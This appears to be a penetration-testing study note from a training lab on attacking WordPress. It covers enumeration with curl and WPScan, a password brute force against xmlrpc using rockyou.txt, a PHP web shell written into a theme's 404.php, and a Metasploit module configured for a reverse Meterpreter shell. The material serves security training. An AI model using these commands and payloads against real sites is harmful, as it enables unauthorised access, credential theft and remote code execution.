# Discovery/Footprinting


A quick way to identify a WordPress site is by browsing to the /robots.txt file. A typical robots.txt on a WordPress installation may look like:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```


WordPress stores its plugins in the wp-content/plugins directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the wp-content/themes directory. These files should be carefully enumerated as they may lead to RCE.

    
# Wordpress Default Users    
There are five types of users on a standard WordPress installation.

- Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
    
- Editor: An editor can publish and manage posts, including the posts of other users.
    
- Author: They can publish and manage their own posts.
    
- Contributor: These users can write and manage their own posts but cannot publish them.
    
- Subscriber: These are standard users who can browse posts and edit their profiles.



# Enumeration

```
$ curl -s http://blog.inlanefreight.local | grep WordPress

$ curl -s http://blog.inlanefreight.local/ | grep themes

$ curl -s http://blog.inlanefreight.local/ | grep plugins

```




# Enumerating Users




    

### WPScan

`$ sudo gem install wpscan`


We can obtain an API token from WPVulnDB, which is used by WPScan to scan for PoC and reports.


The --enumerate flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments --enumerate ap. Let’s invoke a normal enumeration scan against a WordPress website with the --enumerate flag and pass it an API token from WPVulnDB with the --api-token flag.

`$ sudo wpscan --url http://site.local --enumerate --api-token <SNIP>`

The default number of threads used is 5. However, this value can be changed using the -t flag.




### Login Bruteforce

    
    

WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks:

- xmlrpc (WordPress API through /xmlrpc.php)
- wp-login (tandard WordPress login page)



`$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://site.local`


The --password-attack flag is used to supply the type of attack. The -U argument takes in a list of users or a file containing user names. This applies to the -P passwords option as well. The -t flag is the number of threads which we can adjust up or down depending. 



# Code Execution

        
With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress  Click on Appearance on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme.

Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.

`system($_GET[0]);`


We know that WordPress themes are located at /wp-content/themes/<theme name>. 

`$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`



### Metasploit use

The wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically.

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local

```

